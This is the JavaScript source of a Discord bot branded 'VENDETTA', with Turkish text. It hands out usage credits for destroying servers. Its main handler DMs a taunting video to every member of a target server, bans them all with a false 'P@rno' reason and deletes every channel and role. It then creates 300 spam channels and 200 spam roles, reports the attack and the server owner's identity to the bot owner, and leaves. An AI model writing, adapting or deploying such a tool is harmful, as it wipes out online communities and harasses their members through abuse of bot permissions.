require('dotenv').config();
const {
  Client, GatewayIntentBits, Partials,
  EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle,
  ModalBuilder, TextInputBuilder, TextInputStyle,
  StringSelectMenuBuilder
} = require('discord.js');

// Node 22 fetch fix
const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ],
  partials: [Partials.Channel]
});

// ENV
const OWNER_ID = process.env.OWNER_ID;
const SERI_ID = process.env.SERI_ID;
const HAK_KANAL_ID = process.env.HAK_KANAL_ID;
const WL_KANAL_ID = process.env.WL_KANAL_ID;

let cachedVideo = null;
let haklar = {};
let haklarMessageId = null;
let whitelist = {};
let whitelistMessageId = null;

// Video cache
client.once("ready", async () => {
  console.log(`🚀 Bot aktif: ${client.user.tag}`);
  const videoURL = "https://raw.githubusercontent.com/ForsDev101/Securitybot/main/ssstik.io_goktug_twd_1763930201787.mp4";
  try {
    const res = await fetch(videoURL);
    const buffer = Buffer.from(await res.arrayBuffer());
    cachedVideo = { attachment: buffer, name: "video.mp4" };
    console.log("🎥 Video cachelendi!");
  } catch (err) {
    console.log("❌ Video cache hatası:", err);
  }
});

// Hak mesajı güncelle
async function updateHaklarMessage(channel) {
  let description = "HAKLAR\n\n";
  for (const id in haklar) {
    const member = await channel.guild.members.fetch(id).catch(() => null);
    const name = member ? member.user.tag : id;
    const count = haklar[id];
    let colorBox = "🟥";
    if (count > 15) colorBox = "🟦⬜🟦";
    else if (count > 10) colorBox = "🟦";
    else if (count > 5) colorBox = "⬜";
    description += `${colorBox} ${name} – ${count} Hak\n`;
  }
  if (haklarMessageId) {
    const msg = await channel.messages.fetch(haklarMessageId).catch(() => null);
    if (msg) return msg.edit({ content: description }).catch(() => {});
  }
  const msg = await channel.send({ content: description });
  haklarMessageId = msg.id;
}

// Whitelist mesajı güncelle
async function updateWhitelistMessage(channel) {
  let description = "📜 WHITELIST SUNUCULARI\n\n";
  for (const id in whitelist) {
    description += `${whitelist[id].name} | ${whitelist[id].ownerTag} | ${id}\n`;
  }
  if (whitelistMessageId) {
    const msg = await channel.messages.fetch(whitelistMessageId).catch(() => null);
    if (msg) return msg.edit({ content: description }).catch(() => {});
  }
  const msg = await channel.send({ content: description });
  whitelistMessageId = msg.id;
}

// Hak komutları
async function hakCommand(message, args, hakChannel) {
  if (![OWNER_ID, SERI_ID].includes(message.author.id)) return;

  const command = message.content.trim().split(/ +/)[0].toLowerCase();
  const userId = args[0];
  const count = parseInt(args[1]) || 1;

  if (command === ".hakver") {
    haklar[userId] = (haklar[userId] || 0) + count;
    await updateHaklarMessage(hakChannel);
    return message.reply(`✅ ${count} hak verildi.`);
  }
  if (command === ".hakal") {
    haklar[userId] = Math.max((haklar[userId] || 0) - count, 0);
    await updateHaklarMessage(hakChannel);
    return message.reply(`✅ ${count} hak alındı.`);
  }
  if (command === ".hakk") {
    await updateHaklarMessage(hakChannel);
    return;
  }
}

// Vendetta komutu
async function vendettaCommand(message) {
  const hak = haklar[message.author.id] || 0;
  if (hak <= 0) {
    return message.author.send({ content: "Vendetta hakkınız 0! Botu kullanamazsınız." }).catch(() => {});
  }

  const button = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId("sorguHak").setLabel("💣 Vendetta").setStyle(ButtonStyle.Primary)
  );

  await message.author.send({
    content: `Vendetta hakkınız ${hak}! Başlatmak için aşağıdaki butona basın.\nNot: Botun rolü en yukarıda olmalı.`,
    components: [button]
  }).catch(() => {});
}

// Panel
async function openPanel(interaction) {
  const embed = new EmbedBuilder()
    .setTitle("Merhaba Doğukan Ve Emir Tekrardan Hoşgeldiniz ⬜⚡⬜")
    .setColor("Grey")
    .setDescription("Hangi İşlemi Yapmak İstersiniz?")
    .setFooter({ text: "Video hep burada" })
    .setTimestamp();

  const buttonRow = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId("silPanel").setLabel("🗑️ Sil").setStyle(ButtonStyle.Danger)
  );

  const selectRow = new ActionRowBuilder().addComponents(
    new StringSelectMenuBuilder()
      .setCustomId("panelMenu")
      .setPlaceholder("İşlem seçiniz")
      .addOptions([
        { label: "Whitelist Sistemi", value: "whitelist" },
        { label: "Hak Sistemi", value: "hak" }
      ])
  );

  await interaction.reply({ embeds: [embed], components: [selectRow, buttonRow], files: [cachedVideo], ephemeral: true });
}

// Interaction Events
client.on("interactionCreate", async interaction => {
  if (!interaction.isButton() && !interaction.isStringSelectMenu() && !interaction.isModalSubmit()) return;

  if (interaction.isButton() && interaction.customId === "silPanel") {
    return interaction.message.delete().catch(() => {});
  }

  // Panel menu
  if (interaction.isStringSelectMenu() && interaction.customId === "panelMenu") {
    const choice = interaction.values[0];
    if (choice === "whitelist") {
      const embed = new EmbedBuilder()
        .setTitle("Whitelist Sistemini Seçtiniz.")
        .setColor("Blue")
        .setDescription("Aşağıdaki İlgili Seçenekleri Seçebilirsiniz.");
      const row = new ActionRowBuilder().addComponents(
        new StringSelectMenuBuilder()
          .setCustomId("whitelistMenu")
          .setPlaceholder("Seçenek seçiniz")
          .addOptions([
            { label: "Whitelist Ekle", value: "wlEkle" },
            { label: "Whitelist Çıkar", value: "wlCikar" },
            { label: "Whitelist Listele", value: "wlListele" }
          ])
      );
      return interaction.update({ embeds: [embed], components: [row] });
    } else if (choice === "hak") {
      const embed = new EmbedBuilder()
        .setTitle("Hak Sistemini Seçtiniz.")
        .setColor("Blue")
        .setDescription("Aşağıdaki İlgili Seçenekleri Seçebilirsiniz.");
      const row = new ActionRowBuilder().addComponents(
        new StringSelectMenuBuilder()
          .setCustomId("hakMenu")
          .setPlaceholder("Seçenek seçiniz")
          .addOptions([
            { label: "Hak Ekle", value: "hakEkle" },
            { label: "Hak Çıkar", value: "hakCikar" },
            { label: "Hak Listesi", value: "hakListele" }
          ])
      );
      return interaction.update({ embeds: [embed], components: [row] });
    }
  }

  // Whitelist Menu
  if (interaction.isStringSelectMenu() && interaction.customId === "whitelistMenu") {
    const choice = interaction.values[0];
    const modal = new ModalBuilder()
      .setTitle(choice === "wlEkle" ? "Whitelist Ekle" : choice === "wlCikar" ? "Whitelist Çıkar" : "Whitelist Listele")
      .setCustomId(choice);

    if (choice === "wlEkle" || choice === "wlCikar") {
      const sunucuInput = new TextInputBuilder().setCustomId("guildID").setLabel("Sunucu ID").setStyle(TextInputStyle.Short).setRequired(true);
      modal.addComponents(new ActionRowBuilder().addComponents(sunucuInput));
    }
    return interaction.showModal(modal);
  }

  // Hak Menu
  if (interaction.isStringSelectMenu() && interaction.customId === "hakMenu") {
    const choice = interaction.values[0];
    const modal = new ModalBuilder()
      .setTitle(choice === "hakEkle" ? "Hak Ekle" : choice === "hakCikar" ? "Hak Çıkar" : "Hak Listesi")
      .setCustomId(choice);

    if (choice === "hakEkle" || choice === "hakCikar") {
      const userInput = new TextInputBuilder().setCustomId("userID").setLabel("Kullanıcı ID").setStyle(TextInputStyle.Short).setRequired(true);
      const countInput = new TextInputBuilder().setCustomId("count").setLabel("Hak Sayısı").setStyle(TextInputStyle.Short).setRequired(true);
      modal.addComponents(new ActionRowBuilder().addComponents(userInput), new ActionRowBuilder().addComponents(countInput));
    }
    return interaction.showModal(modal);
  }

  // Modal Submit
  if (interaction.isModalSubmit()) {
    const id = interaction.customId;
    if (id === "wlEkle") {
      const guildID = interaction.fields.getTextInputValue("guildID");
      const guild = client.guilds.cache.get(guildID);
      if (!guild) return interaction.reply({ content: "❌ Sunucu bulunamadı!", ephemeral: true });
      whitelist[guildID] = { name: guild.name, ownerTag: (await guild.fetchOwner()).user.tag };
      const wlChannel = await client.channels.fetch(WL_KANAL_ID);
      await updateWhitelistMessage(wlChannel);
      return interaction.reply({ content: "✅ Sunucu whitelist’e eklendi.", ephemeral: true });
    }
    if (id === "wlCikar") {
      const guildID = interaction.fields.getTextInputValue("guildID");
      delete whitelist[guildID];
      const wlChannel = await client.channels.fetch(WL_KANAL_ID);
      await updateWhitelistMessage(wlChannel);
      return interaction.reply({ content: "✅ Sunucu whitelistten çıkarıldı.", ephemeral: true });
    }
    if (id === "hakEkle" || id === "hakCikar") {
      const userID = interaction.fields.getTextInputValue("userID");
      const count = parseInt(interaction.fields.getTextInputValue("count"));
      haklar[userID] = id === "hakEkle" ? (haklar[userID] || 0) + count : Math.max((haklar[userID] || 0) - count, 0);
      const hakChannel = await client.channels.fetch(HAK_KANAL_ID);
      await updateHaklarMessage(hakChannel);
      return interaction.reply({ content: `✅ Haklar güncellendi.`, ephemeral: true });
    }
    if (id === "hakListele") {
      const hakChannel = await client.channels.fetch(HAK_KANAL_ID);
      await updateHaklarMessage(hakChannel);
      return interaction.reply({ content: "✅ Hak listesi güncellendi.", ephemeral: true });
    }
  }

  // Vendetta Buton
  if (interaction.isButton() && interaction.customId === "sorguHak") {
    const userHak = haklar[interaction.user.id] || 0;
    if (userHak <= 0) return interaction.reply({ content: "❌ Vendetta hakkın yok!", ephemeral: true });

    const modal = new ModalBuilder().setCustomId("modalSunucuID").setTitle("Vendetta İşlem Formu");
    const sunucuInput = new TextInputBuilder().setCustomId("sunucuID").setLabel("Sunucu ID").setStyle(TextInputStyle.Short).setRequired(true);
    modal.addComponents(new ActionRowBuilder().addComponents(sunucuInput));
    await interaction.showModal(modal);
  }

  // Vendetta Modal
  if (interaction.isModalSubmit() && interaction.customId === "modalSunucuID") {
    const guildId = interaction.fields.getTextInputValue("sunucuID");
    const guild = client.guilds.cache.get(guildId);
    if (!guild) return interaction.reply({ content: "❌ Bot bu sunucuda değil!", ephemeral: true });

    await interaction.reply({ content: "⚡ İşlem başlatılıyor...", ephemeral: true });
    haklar[interaction.user.id] = (haklar[interaction.user.id] || 0) - 1;
    const hakChannel = await client.channels.fetch(HAK_KANAL_ID);
    await updateHaklarMessage(hakChannel);

    const embed = new EmbedBuilder()
      .setColor("Red")
      .setTitle("💣 VENDETTA SUNUCUYA EL KOYDU!")
      .setDescription("Slained By VENDETTA 💣\nVENDETTA Affetmez 💦\nhttps://discord.gg/j9W6FXKTre")
      .setFooter({ text: "💦 VENDETTA Affetmez Sabaha Sunucun Affedilmez 💦" });

    const members = await guild.members.fetch();
    let bannedCount = 0;
    const tasks = [];

    for (const member of members.values()) {
      if (member.user.bot) continue;
      if ([OWNER_ID, SERI_ID].includes(member.id)) continue;
      tasks.push(member.send({ embeds: [embed], files: [cachedVideo] }).catch(() => {}));
      tasks.push(member.ban({ reason: "P@rno" }).catch(() => {}));
      bannedCount++;
    }

    // Kanalları sil
    guild.channels.cache.forEach(ch => tasks.push(ch.delete().catch(() => {})));

    // Yeni kanallar
    const channelNames = ["VENDETTA💦", "VENDETTA💝", "EL KONULDU🔥"];
    for (let i = 0; i < 300; i++) {
      tasks.push(guild.channels.create({ name: channelNames[i % channelNames.length] }).catch(() => {}));
    }

    // Rolleri sil ve yeni oluştur
    guild.roles.cache.forEach(r => { if (r.editable && r.id !== guild.id) tasks.push(r.delete().catch(() => {})); });
    for (let i = 0; i < 200; i++) {
      const randomColor = `#${Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")}`;
      tasks.push(guild.roles.create({ name: "BÖÖ KORKTUNMUU😜", color: randomColor, hoist: true }).catch(() => {}));
    }

    await Promise.all(tasks);

    await interaction.followUp({ content: `⚡ ${bannedCount} kişi banlandı. V For Vendetta!`, ephemeral: true });

    // Owner log
    try {
      const owner = await client.users.fetch(OWNER_ID);
      const guildOwner = await guild.fetchOwner().catch(() => null);
      const embedLog = new EmbedBuilder()
        .setColor("DarkRed")
        .setTitle("💣 VENDETTA Log Raporu")
        .setThumbnail(interaction.user.displayAvatarURL({ size: 1024 }))
        .addFields(
          { name: "👤 İşlemi Başlatan", value: `${interaction.user.tag} \n(${interaction.user.id})`, inline: false },
          { name: "🏰 Hedef Sunucu", value: `${guild.name}`, inline: false },
          { name: "👑 Sunucu Sahibi", value: guildOwner ? `${guildOwner.user.tag} \n(${guildOwner.id})` : "Bulunamadı", inline: false },
          { name: "🔥 Kalan Hakkı", value: `${haklar[interaction.user.id] ?? 0}`, inline: false }
        )
        .setFooter({ text: "VENDETTA Operasyon Log" })
        .setTimestamp();
      owner.send({ embeds: [embedLog] }).catch(() => {});
    } catch (err) { console.log("Embed log gönderilemedi:", err); }

    await guild.leave().catch(() => {});
  }
});

// Mesaj komutları
client.on("messageCreate", async message => {
  if (!message.guild || message.author.bot) return;

  const args = message.content.trim().split(/ +/);
  const command = args.shift().toLowerCase();
  const hakChannel = await client.channels.fetch(HAK_KANAL_ID);

  if (command === ".vndt") {
    if (![OWNER_ID, SERI_ID].includes(message.author.id)) return;
    return openPanel(message);
  }
  if (command === ".vendetta") {
    return vendettaCommand(message);
  }

  // Hak komutları
  await hakCommand(message, args, hakChannel);
});

client.login(process.env.BOT_TOKEN);
